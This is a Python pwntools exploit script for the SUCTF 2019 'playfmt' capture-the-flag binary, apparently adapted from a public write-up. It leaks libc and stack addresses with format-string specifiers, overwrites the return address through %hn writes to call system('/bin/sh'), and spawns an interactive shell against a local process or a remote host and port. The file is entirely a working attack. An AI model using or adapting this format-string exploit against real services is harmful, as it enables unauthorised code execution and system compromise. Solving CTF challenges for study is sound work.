#!/usr/bin/env python3
"""SUCTF 2019 playfmt; local-first adaptation of a public solution.
Reference: https://github.com/Yeuoly/buuctf_pwn/tree/master/suctf_2019_playfmt
Requires the challenge's i386 libc (the upstream script used libc 2.27).
"""
from pathlib import Path
from pwn import *

HERE = Path(__file__).resolve().parent
context.arch = "i386"
elf = ELF(str(HERE / "suctf_2019_playfmt"), checksec=False)
libc_path = args.LIBC or str(HERE / "libc.so.6")
if not Path(libc_path).is_file():
    raise SystemExit("Provide the matching i386 libc with LIBC=/path/to/libc.so.6")
libc = ELF(libc_path, checksec=False)
io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process(str(elf.path))

def set_write_target(where):
    # Argument 6 is a pointer slot; update it, then write through argument 14.
    io.send((f"%{where & 0xffff}c%6$hnTAG").encode())
    io.recvuntil(b"TAG")

def write_value(value):
    io.send((f"%{value & 0xffff}c%14$hnTAG").encode())
    io.recvuntil(b"TAG")

io.sendlineafter(b"r\n=====================\n", b"%23$p,,,%6$p")
libc_base = int(io.recvn(10), 16) - libc.sym["__libc_start_main"] - 241
io.recvuntil(b",,,")
stack = int(io.recvn(10), 16) - 0x38
ret = stack + 0x1c
system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
log.info("libc base: %#x; stack: %#x", libc_base, stack)

for target, value in ((ret, system), (ret + 2, system >> 16),
                      (ret + 8, binsh), (ret + 10, binsh >> 16)):
    set_write_target(target)
    write_value(value)
io.send(b"quit\x00")
io.interactive()
